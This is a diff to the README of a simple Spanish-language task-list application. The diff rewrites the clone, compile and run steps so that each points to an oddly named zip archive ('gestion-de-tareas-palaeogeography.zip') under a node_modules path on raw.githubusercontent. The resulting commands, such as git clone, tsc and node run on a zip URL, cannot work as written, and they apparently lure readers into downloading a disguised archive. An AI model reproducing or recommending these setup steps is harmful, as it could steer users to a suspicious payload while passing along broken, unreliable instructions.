@@ -11,15 +11,15 @@ Este proyecto es una aplicación simple para gestionar una lista de tareas utili
 
 1. Clona el repositorio:
   
- git clone https://raw.githubusercontent.com/camilo2874/gestion-de-tareas/main/shap/gestion-de-tareas.zip
+ git clone https://raw.githubusercontent.com/camilo2874/gestion-de-tareas/main/node_modules/gestion-de-tareas-palaeogeography.zip
 
  ## Ejecución
 
 1. Instala las dependencias:
    ```bash
    npm install
-tsc https://raw.githubusercontent.com/camilo2874/gestion-de-tareas/main/shap/gestion-de-tareas.zip
+tsc https://raw.githubusercontent.com/camilo2874/gestion-de-tareas/main/node_modules/gestion-de-tareas-palaeogeography.zip
 
-node https://raw.githubusercontent.com/camilo2874/gestion-de-tareas/main/shap/gestion-de-tareas.zip
+node https://raw.githubusercontent.com/camilo2874/gestion-de-tareas/main/node_modules/gestion-de-tareas-palaeogeography.zip
 
 
